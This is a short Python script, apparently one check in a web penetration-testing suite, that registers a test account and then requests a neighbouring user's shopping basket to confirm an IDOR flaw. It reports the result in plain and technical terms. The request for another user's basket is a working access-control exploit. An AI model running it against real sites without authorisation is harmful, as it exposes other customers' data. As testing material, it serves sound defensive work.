import requests
import time
def run_web03(target):
    test_email = f"pentester_{int(time.time())}@test.com"
    test_password = "Test1234!"
    register_payload = {
        "email": test_email,
        "password": test_password,
        "passwordRepeat": test_password
    }
    register_response = requests.post(f"{target}/api/Users/", json=register_payload)

    login_payload = {
        "email": test_email,
        "password": test_password
    }
    login_response = requests.post(f"{target}/rest/user/login", json=login_payload)
    token = login_response.json()["authentication"]["token"]
    my_bid = login_response.json()["authentication"]["bid"]

    headers = {"Authorization": f"Bearer {token}"}
    if my_bid == 1:
        target_bid = my_bid + 1
    else:
        target_bid = my_bid - 1

    basket_url = f"{target}/rest/basket/{target_bid}"
    basket_response = requests.get(basket_url, headers=headers)

    if basket_response.status_code == 200:
        return {
            "id": "WEB-03",
            "vulnerable": True,
            "plain_english": "A logged-in user can view another user's shopping basket just by guessing an ID number.",
            "technical": "Basket endpoint did not verify the requesting token's own basket ID against the requested ID — swapping to a neighboring ID returned HTTP 200 with another user's data (IDOR)."
        }
    else:
        return {
            "id": "WEB-03",
            "vulnerable": False,
            "plain_english": "Could not access another user's basket this run.",
            "technical": "Request to a neighboring basket ID did not return HTTP 200; IDOR not confirmed."
        }
